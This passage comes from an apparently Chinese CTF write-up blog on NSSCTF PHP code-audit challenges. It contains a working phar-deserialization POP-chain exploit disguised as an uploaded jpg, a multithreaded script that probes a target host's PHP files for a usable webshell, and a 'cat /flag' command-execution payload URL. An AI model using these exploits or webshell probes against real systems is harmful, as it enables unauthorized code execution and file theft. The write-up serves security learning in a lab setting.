class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>upload_file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">upload_file</span>(); </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>得到 function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123; </span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); </span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>在 class.php 的第 23 行可以知道要利用 phar 反序列化，后缀名为 jpg，有用的也就 file.php 里面的 file_exists 函数，利用这个函数可以构造 pop 链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cle4r-&gt;str=new Show(); __destruct()-&gt; show::__toString() -&gt; show::str[&#x27;str&#x27;]=new Test() -&gt; Test::__get()-&gt;Test::get()-&gt;Test::paramas[&#x27;source&#x27;]=f1ag.php-&gt;Test::file_get()</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str=<span class="keyword">array</span>(<span class="string">&#x27;str&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Test</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>(<span class="string">&#x27;source&#x27;</span>=&gt;<span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置sutb</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将上述代码命名为 phar.php，本地访问 php，将生成的 phar.phar 改名为 phar.jpg 并上传</p><p>function.php 第 8 行对上传的文件名进行了 md5 加密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line"><span class="comment">// $_FILES[&quot;file&quot;][&quot;name&quot;] 是我们上传的文件的名称</span></span><br><span class="line"><span class="comment">// $_SERVER[&quot;REMOTE_ADDR&quot;] 是浏览当前页面的用户的 IP 地址，在 index.php 的右上角可以看到</span></span><br></pre></td></tr></table></figure><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5-3.png" alt="5-3"></p><p>payload</p><blockquote><p>file.php?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;68ed54627d081dd9f9ca00b5ce7e2372.jpg</p></blockquote><p>访问得到 base64，解码得到 flag</p><h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p>根据提示，访问 <code>www.tar.gz</code> 得到源码</p><p>里面有 3001 个 php 和一个 index.html，而且 php 名字也得不到信息，随便点开几个 php 查看，可以看到一句话木马，随便试了几个没有反应</p><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6-1.png" alt="6-1"></p><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6-2.png" alt="6-2"></p><p>那么目的就很简单了，我们需要在这么多 php 里面找到可以利用的 一句话木马 ，我们再通过访问这个 php 里面的参数就可以达到 cat flag 的目的了</p><p>这么多 php 只能用脚本来跑，记得更改第 8 行为你的 php 地址，第 27 行为你的靶机地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>) <span class="comment"># 这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;src&quot;</span> <span class="comment"># php 的文件路径</span></span><br><span class="line">os.chdir(filePath) <span class="comment"># 改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span> <span class="comment"># 设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span> <span class="comment"># 设置连接活跃状态为 False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">file</span>):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f: <span class="comment"># 打开 php 文件，提取所有的 $_GET 和 $_POST 的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125; <span class="comment"># 所有的 $_POST</span></span><br><span class="line">    params = &#123;&#125; <span class="comment"># 所有的 $_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    proxies = &#123; <span class="string">&quot;http&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;https&quot;</span>: <span class="literal">None</span>&#125; <span class="comment"># 用来防止连接超时</span></span><br><span class="line">    url = <span class="string">&#x27;http://1.14.71.254:28831/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params,proxies=proxies) <span class="comment"># 一次性请求所有的 GET 和 POST</span></span><br><span class="line">    req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content: <span class="comment"># 如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>,proxies=proxies)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:    <span class="comment"># flag 用来判断参数是 GET 还是 POST，如果是 GET，flag==1，则 b 未定义；如果是 POST，flag为 0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6-3.png" alt="6-3"></p><p>找到这个 php 文件，它是以 GET 传参的</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28831/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</span><br></pre></td></tr></table></figure><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6-4.png" alt="6-4"></p><h1 id="UUCTF-2022-新生赛-funmd5"><a href="#UUCTF-2022-新生赛-funmd5" class="headerlink" title="[UUCTF 2022 新生赛]funmd5"></a>[UUCTF 2022 新生赛]funmd5</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$time</span>=<span class="title function_ invoke__">time</span>();</span><br><span class="line"><span class="variable">$guessmd5</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$time</span>);</span><br><span class="line"><span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&quot;md5&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$md5</span>))&#123;</span><br><span class="line">    <span class="variable">$sub</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$time</span>,-<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$md5</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/^(.*)0e(.*)$/&#x27;</span>,<span class="string">&#x27;$&#123;1&#125;no_science_notation!$&#123;2&#125;&#x27;</span>,<span class="variable">$md5</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/0e/&#x27;</span>,<span class="variable">$md5</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$md5</span>[<span class="number">0</span>]=<span class="title function_ invoke__">substr</span>(<span class="variable">$md5</span>[<span class="number">0</span>],<span class="variable">$sub</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$md5</span>[<span class="number">0</span>]==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>[<span class="number">0</span>])&amp;&amp;<span class="variable">$md5</span>[<span class="number">1</span>]===<span class="variable">$guessmd5</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;well!you win again!now flag is yours.&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$md5</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;oh!no!maybe you need learn more PHP!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span 